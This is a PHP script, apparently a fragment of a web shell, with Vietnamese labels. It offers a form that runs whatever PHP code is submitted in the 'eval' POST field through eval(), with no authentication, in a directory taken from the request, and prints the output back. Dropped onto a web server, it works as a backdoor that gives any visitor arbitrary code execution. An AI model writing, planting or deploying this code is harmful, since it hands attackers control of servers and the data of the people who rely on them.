<?php

$eval = $_POST['eval'];
 if (!empty($eval))
 {
  echo "<b>Kết quả chạy thử code PHP</b>:<br>";
  $tmp = ob_get_contents();
  $olddir = realpath(".");
  @chdir($d);
  if ($tmp)
  {
   ob_clean();
   eval($eval);
   $ret = ob_get_contents();
   $ret = convert_cyr_string($ret,"d","w");
   ob_clean();
   echo $tmp;
   if ($eval_txt)
   {
    $rows = count(explode("\r\n",$ret))+1;
    if ($rows < 10) {$rows = 10;}
    echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
   }
   else {echo $ret."<br>";}
  }
  else
  {
   if ($eval_txt)
   {
    echo "<br><textarea cols=\"122\" rows=\"15\" readonly>";
    eval($eval);
    echo "</textarea>";
   }
   else {echo $ret;}
  }
  @chdir($olddir);
 }
 else {echo "<b>Chèn code php vào ( bỏ đi <?php và ?> nhé)</b>"; if (empty($eval_txt)) {$eval_txt = true;}}
 echo "<form method=\"POST\"><textarea name=\"eval\" cols=\"122\" rows=\"10\">".htmlspecialchars($eval)."</textarea>
 <input type=\"hidden\" name=\"d\" value=\"".$dispd."\"><br><br>
 <input type=\"submit\" value=\"Execute\">&nbsp; Đưa vào khung văn bản&nbsp;
 <input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "></form>";
